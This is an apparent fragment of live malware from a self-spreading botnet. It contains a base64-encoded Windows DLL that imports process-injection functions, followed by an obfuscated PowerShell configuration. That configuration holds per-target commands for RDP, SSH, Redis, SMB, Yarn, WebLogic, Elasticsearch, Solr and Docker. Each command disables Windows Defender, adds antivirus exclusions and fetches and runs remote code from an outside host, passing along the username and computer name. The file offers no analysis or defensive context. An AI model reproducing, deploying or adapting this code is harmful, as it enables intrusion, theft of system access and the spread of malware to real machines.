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V4dAAApQJHZXRUaWNrQ291bnQAAN4CSGVhcEFsbG9jAPkCSW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbgBLA0xlYXZlQ3JpdGljYWxTZWN0aW9uAABXA0xvY2FsQWxsb2MAAFsDTG9jYWxGcmVlAJYDT3BlblByb2Nlc3MAqQNQcm9jZXNzMzJGaXJzdAAAqwNQcm9jZXNzMzJOZXh0ALsDUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAAARSZXN1bWVUaHJlYWQAAAEEUnRsQWRkRnVuY3Rpb25UYWJsZQACBFJ0bENhcHR1cmVDb250ZXh0AAkEUnRsTG9va3VwRnVuY3Rpb25FbnRyeQAAEARSdGxWaXJ0dWFsVW53aW5kAACKBFNldFRocmVhZENvbnRleHQAAJ8EU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAKwEU2xlZXAAugRUZXJtaW5hdGVQcm9jZXNzAADBBFRsc0dldFZhbHVlAM4EVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAADnBFZpcnR1YWxBbGxvY0V4AADsBFZpcnR1YWxQcm90ZWN0AADuBFZpcnR1YWxRdWVyeQAA9gRXYWl0Rm9yU2luZ2xlT2JqZWN0ACsFV3JpdGVQcm9jZXNzTWVtb3J5AABOAF9fZGxsb25leGl0AFMAX19pb2JfZnVuYwAAeABfYW1zZ19leGl0AAAaAV9pbml0dGVybQCAAV9sb2NrACUCX29uZXhpdACDAl9zdHJpY21wAADEAl91bmxvY2sAfwNhYm9ydACQA2NhbGxvYwAAtwNmcmVlAADCA2Z3cml0ZQAA8ANtYWxsb2MAAPgDbWVtY3B5AAAWBHNpZ25hbAAAJARzdHJjbXAAACsEc3RybGVuAAAuBHN0cm5jbXAATgR2ZnByaW50ZgAAAAAAoAAAAKAAAACgAAAAoAAAAKAAAACgAAAAoAAAQURWQVBJMzIuZGxsAAAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSg'+'AAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAAEtFUk5FTDMyLmRsbAAAAAAooAAAKKAAACigAAAooAAAKKAAACigAAAooAAAKKAAACigAAAooAAAKKAAACigAAAooAAAKKAAACigAAAooAAAKKAAACigAAAooAAAbXN2Y3J0LmRsbxrAAAAAAAAAAAAAAAAAAAAAAAAAACwHaxrAAAAAIAdrGssawAAAABgwKxrAAAAAKyFrGsAAAAAMLCsawwAAAAAqAAAAFAAADAAAABQoFigYKCQoaChsKHAodCh4KHwoQCiEKIgojCiQKJQomCicKKAopCiALAAABAAAAAYoDCgOKAAAADAAAAQAAAAIKAooDCgOKAA4AAAIAAAABCgQKBwoMCg8KBAoXChoKHQoUCicKKgogDwAAAQAAAAm6C+r+Sv/a8AAAEAgAAAACighKCvoNOg/aAKoSOhRaFToWihuaHUofGhDqI9omOieKKXoq+ixqL2olijYaNuo3ujn6PDo9Cj9KMYpDukSKRrpI6ksaTUpAylUKV3pYSlkaXOpQGnQ6g3rJqsp6y+rMus2Kz8rAmtFq0trVKtea2lrcKt1K4AAAAQAQAkAAAAwaLiogajO6NMo2Cjd6OZo5WowajxqB+px6kAAAAgAQBcAAAA2qQopT2lY6UJphqmJKZDpmCmfqaRpqKmrKbEpgKnJKdKp3KnoKdUqIery6vdqxmsSaxurI6sw6zbrPesE60trUWtXa14rbWt0q3qrROuO65jruqvADABACgAAAACoBqgMqDdoLyk8qScpc+uBa8SryevO69Ir2avya//rwBAAQBUAAAAPKBUoGGgfKCQoKWgr6DEoM6g36DxoHahn6G+oReiRqJkopOiraLdogijKKNXo3WjpKO+o9Oj3aPuo/6jMqRMpGCkcaR9pJykv6RFpgBQAQBgAAAAj6UtpkmmXKZ4poump6a6ptam46b/phunN6dsp5Sn0Kfdp/Kn/KcUqCGoT6iwqMyo36j0qBCpI6k/qVKpbqmKqaapwqneqRSqP6ppqkurnK+8r9qv66/8rwBgAQBMAAAABqAToEGgiqCmoLegwaDOoAWhUqFjoW2hfqGIoZWhoqHHoR6iO6JOomuieqKsormixqLRot6i/6Ijo0ejIaQGpT2l4aUAcAEAUAAAAI2hx6H6oQyiaqLOovqiCaMho2+jr6Pbo+6jSqR7pKOkzKQspVSleqWgpcil+6VSpn6mkab5pneno6e2p9en3aj9qK2p6qoAAACgAQAcAAAA2aElpESlkqfWqEqqnKvCraavAAAAsAEAEAAAAPihpKOJpAAAAMABAFQAAAAgoFig8KBAoYChuKHwoRCiSKJ4ouiiMKNYo6Cj0KPooxikQKSgpBClUKWgpfClOKaIpsCmEKcop0CnWKe4p+inEKhAqGiomKjgqBCpAOABAAwAAABCq02vAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==utH9

wB69jsb64=utH9CnZhciBjbWQgPW5ldyBBY3RpdmVYT2JqZWN0KCJXU2NyaXB0LlNoZWxsIik7dmFyIGNtZHN0cj0iY21kIC9jIHBvd2Vyc2hlbGwgLXcgaGlkZGVuIFtOZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrPXsxfTtJRWB4KE5lYHctT2JqYGVjdCBOZXQuV2ViQ2BsaWVudCkuRG93bkxvYWRTdHJpbmcoJ2h0dHBzOi8vdC5tN24nKycweS5jb20vN3AucGhwPzIuMCp1c2JfanMqJXVzZXJuYW1lJSolY29tcHV0ZXJuYW1lJSonK1tFbnZpcm9ubWVudF06Ok9TVmVyc2lvbi52ZXJzaW9uLk1ham9yKTticHUgKCdodHRwczovL3QubTduJysnMHkuY29tL3VzYi5qc3A/anNfMi4wJykiO2NtZC5ydW4oY21kc3RyLDAsMSk7Cg==utH9

wB69batb64=utH9CmNtZCAvYyBzdGFydCAvYiBwb3dlcnNoZWxsIC13IGhpZGRlbiBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZXJ2ZXJDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjaz17MX07SUVgeChOZWB3LU9iamBlY3QgTmV0LldlYkNgbGllbnQpLkRvd25Mb2FkU3RyaW5nKCdodHRwczovL3QubTduJysnMHkuY29tLzdwLnBocD8yLjAqaXBjX2JhdColdXNlcm5hbWUlKiVjb21wdXRlcm5hbWUlKicrW0Vudmlyb25tZW50XTo6T1NWZXJzaW9uLnZlcnNpb24uTWFqb3IpO2JwdSAoJ2h0dHBzOi8vdC5tN24nKycweS5jb20vaXBjLmpzcD9iYXRfMi4wJykKY21kIC9jIGRlbCAlMAo=utH9

wB69rdp_cmd=utH9cmd /c powershell Set-MpPreference -DisableRealtimeMonitoring 1;Add-MpPreference -ExclusionProcess c:9e0windows9e0system329e0WindowsPowerShell9e0v1.09e0powershell.exe&powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEX(New-Object Net.WebClient).DownloadString(utH9utH9https://t.m7nutH9utH9+utH9utH90y.com/rdp.jsp?2.0utH9utH9)utH9

wB69rdpo_cmd=utH9cmd /c powershell Set-MpPreference -DisableRealtimeMonitoring 1;Add-MpPreference -ExclusionProcess c:9e0windows9e0system329e0WindowsPowerShell9e0v1.09e0powershell.exe&powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEX(New-Object Net.WebClient).DownloadString(utH9utH9https://t.m7nutH9utH9+utH9utH90y.com/rdpo.jsp?2.0utH9utH9)utH9

wB69ssh_cmd=utH9export src=ssh;curl -fksSL https://t.m7n0y.com/ln/core.png?ssh*2.0uOvabashutH9

wB69ssho_cmd=utH9export src=ssho;curl -fksSL https://t.m7n0y.com/ln/core.png?ssho*2.0uOvabashutH9

wB69redis_cmd=utH9export src=rds;curl -fksSL https://t.m7n0y.com/ln/core.png?rds*2.0uOvabashutH9

wB69rediso_cmd=utH9export src=rdso;curl -fksSL https://t.m7n0y.com/ln/core.png?rdso*2.0uOvabashutH9

wB69smgh_cmd=utH9cmd /c powershell Set-MpPreference -DisableRealtimeMonitoring 1;Add-MpPreference -ExclusionProcess c:/windows/system32/WindowsPowerShell/v1.0/powershell.exe;Add-MpPreference -ExclusionPath c:/ & powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEx(New-Object Net.WebClient).DownLoadString(utH9utH9https://t.m7nutH9utH9+utH9utH90y.com/smgh.jsp?2.0*%computername%utH9utH9)utH9

wB69smgho_cmd=utH9cmd /c powershell Add-MpPreference -ExclusionProcess c:/windows/system32/WindowsPowerShell/v1.0/powershell.exe;Add-MpP'+'reference -ExclusionPath c:/&powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEx(New-Object Net.WebClient).DownLoadString(utH9utH9https://t.m7nutH9utH9+utH9utH90y.com/smgho.jsp?2.0*%computername%utH9utH9)utH9

wB69yarn_cmd=utH9export src=yarn;curl -fksSL https://t.m7n0y.com/ln/core.png?yarn*2.0uOvabashutH9

wB69yarno_cmd=utH9export src=yarno;curl -fksSL https://t.m7n0y.com/ln/core.png?yarno*2.0uOvabashutH9

wB69logic_cmd=utH9cmd /c powershell -e UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAYwA6AFwAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQ'+'AHIAbwBjAGUAcwBzACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA & powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEir8x(Neir8w-Objir8ect Net.WebCir8lient).DownLoadString(utH9utH9https://t.m7nutH9utH9+utH9utH90y.com/logic.jsp?2.0*%computername%utH9utH9)utH9,utH9export src=logic;curl -fksSL https://t.m7n0y.com/ln/core.png?logic*2.0uOvabashutH9

wB69logico_cmd=utH9cmd /c powershell -e UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAYwA6AFwAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA & powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEir8x(Neir8w-Objir8ect Net.WebCir8lient).DownLoadString(utH9utH9https://t.m7nutH9utH9+utH9utH90y.com/logico.jsp?2.0*%computername%utH9utH9)utH9,utH9export src=logico;curl -fksSL https://t.m7n0y.com/ln/core.png?logico*2.0uOvabashutH9

wB69es_cmd=utH9cmd /c powershell -e UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAYwA6AFwAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBc'+'AFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA & powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEx(New-Object Net.WebClient).DownLoadString(utH9utH9https://t.m7nutH9utH9+utH9utH90y.com/es.jsp?2.0*%computername%utH9utH9)utH9,utH9export src=es;curl -fksSL https://t.m7n0y.com/ln/core.png?es*2.0uOvabashutH9

wB69eso_cmd=utH9cmd /c powershell -e UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAYwA6AFwAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA & powershell [Net.ServicePointManager]'+'::ServerCertificateValidationCallback={1};IEx(New-Object Net.WebClient).DownLoadString(utH9utH9https://t.m7nutH9utH9+utH9utH90y.com/eso.jsp?2.0*%computername%utH9utH9)utH9,utH9export src=eso;curl -fksSL https://t.m7n0y.com/ln/core.png?eso*2.0uOvabashutH9

wB69solr_cmd=utH9cmd /c powershell -e UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAYwA6AFwAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA & powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEx(New-Object Net.WebClient).DownLoadString(utH9utH9https://t.m7nutH9utH9+utH9utH90y.com/solr.jsp?2.0*%computername%utH9utH9)utH9,utH9export src=solr;curl -fksSL https://t.m7n0y.com/ln/core.png?solr*2.0uOvabashutH9

wB69solro_cmd=utH9cmd /c powershell -e UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAYwA6AFwAOwBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA & powershell [Net.ServicePointManager]::ServerCertificateValidationCallback={1};IEx(New-Object Net.WebClient).DownLoadString(utH9utH9https://t.m7nutH9utH9+utH9utH90y.com/solro.jsp?2.0*%computername%utH9utH9)utH9,utH9export src=solro;curl -fksSL https://t.m7n0y.com/ln/core.png?solro*2.0uOvabashutH9

wB69docker_cmd=utH9export src=docker;curl -fksSL https://t.m7n0y.com/ln/core.png?docker*2.0uOvabashutH9

wB69dockero_cmd=utH9export src=dockero;curl -fksSL https://t.m7n0y.com/ln/core.png?dockero*2.0uOvabashutH9

wB69core_url=utH9https://t.m7n0y.comutH9




try{wB69VVERSION=wB69ifmd5[0..5]-joinNDckNDck}catch{}

[Net.ServicePointManager]::ServerCertificateValidationCallback={1}

if(!wB69down_url){wB69down_url=utH9https://d.bb3u9.comutH9}

